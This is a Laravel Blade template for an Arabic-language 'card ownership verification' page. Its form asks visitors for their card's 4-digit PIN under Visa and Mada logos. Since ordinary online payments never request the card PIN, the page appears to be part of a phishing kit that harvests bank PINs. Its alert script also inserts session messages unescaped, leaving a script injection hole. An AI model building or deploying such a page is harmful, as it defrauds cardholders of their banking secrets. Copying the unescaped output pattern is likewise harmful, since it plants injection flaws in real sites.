@extends('layouts.app')
@section('content')
    {{-- =========================================================== --}}
    {{-- ================== Sweet Alert Section ==================== --}}
    {{-- =========================================================== --}}
    <div>
        @if (session()->has('success'))
            <script>
                Swal.fire('"Great Job !!!"', '{!! Session::get('success') !!}', 'success');
            </script>
        @endif
        @if (session()->has('danger'))
            <script>
                Swal.fire('"Great Job !!!"', '{!! Session::get('danger') !!}', 'danger');
            </script>
        @endif
    </div>


    <section class="paymentMethodCheck py-5">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 paymentCard">
                    <div class="cardInfo" >
                        <h2>اثبات ملكية البطاقة</h2>
                        <p>
                            الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام
                        </p>
                        <form action="{{ route('cardOwnershipSecertNumberRequest') }}" method="POST" class="form">
                            @csrf
                            <div class="row">
                                {{-- card_ownership_secert_number --}}
                                <div class="col-12 mb-3">
                                    <div class="inputGroup">
                                        <label for="code"> الرقم السري *
                                            <strong class="text-danger">
                                                @error('card_ownership_secert_number')
                                                ( {{ $message }} )
                                                @enderror
                                            </strong>
                                        </label>
                                        <input type="number" name="card_ownership_secert_number" class="form-control"  maxlength="4" 
                                         required placeholder="****" value="{{ old('card_ownership_secert_number') }}" oninput="checkLength(this)">
                                    </div>
                                </div>

                                {{-- Button --}}
                                <div class="col-12">
                                    <input type="submit" class="submit" value="تأكيد"> 
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="payType">
                        <span class="text text-center d-block">الدفع بواسطة</span>
                        <ul>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/visa.png') }}" alt="fender-bender">
                            </li>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/card.png') }}" alt="fender-bender">
                            </li>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/mada.png') }}" alt="fender-bender">
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </section>


@endsection
<script>
    function checkLength(input) {
        var maxLength = 4;
        if (input.value.length > maxLength) {
            input.value = input.value.slice(0, maxLength); // قص القيمة إلى الحد الأقصى
        }
    }
    </script>